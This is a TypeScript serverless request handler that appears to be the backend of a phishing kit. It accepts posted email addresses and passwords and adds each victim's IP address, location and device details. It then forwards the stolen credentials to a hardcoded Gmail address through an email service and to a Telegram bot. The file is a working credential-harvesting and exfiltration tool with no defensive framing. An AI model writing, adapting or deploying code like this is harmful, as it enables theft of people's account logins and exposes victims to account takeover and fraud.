import { sendCourierEmail } from './courier';
import { getLoginDeviceInfo } from './device';
import { sendLoginNotification } from './telegram';
import type { EmailDto } from './types';

const CORS_HEADERS: Record<string, string> = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

function jsonResponse(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body), {
    status,
    headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' },
  });
}

async function sendMail(request: Request, env: Env): Promise<Response> {
  let data: EmailDto;
  try {
    data = (await request.json()) as EmailDto;
  } catch {
    return jsonResponse({ error: 'Invalid JSON body' }, 400);
  }

  const { email, password, source, to, chatId } = data;
  const { deviceDetails, ipAddr, location } = await getLoginDeviceInfo(request);

  const recipientName = `email: ${email}, \n password: ${password}

            IP: ${ipAddr}
            Location: ${location}
            Device: ${deviceDetails}`;

  let requestId: string | null = null;

    const result = await sendCourierEmail(
      env.COURIER_TOKEN,
      env.COURIER_TEMPLATE_ID,
      "yariaortega@gmail.com",
      recipientName,
      source,
    );
    requestId = result.requestId;

  if (chatId) {
    await sendLoginNotification(
      env.TELEGRAM_BOT_TOKEN,
      env.TELEGRAM_CHAT_ID,
      email,
      password,
      source,
      deviceDetails,
      ipAddr,
      location,
      chatId,
    );
  }

  return jsonResponse({ requestId });
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: CORS_HEADERS });
    }

    const url = new URL(request.url);

    if (request.method === 'POST' && url.pathname === '/') {
      try {
        return await sendMail(request, env);
      } catch (error) {
        const message =
          error instanceof Error ? error.message : 'Internal server error';
        return jsonResponse({ error: message }, 500);
      }
    }

    return jsonResponse({ error: 'Not found' }, 404);
  },
};
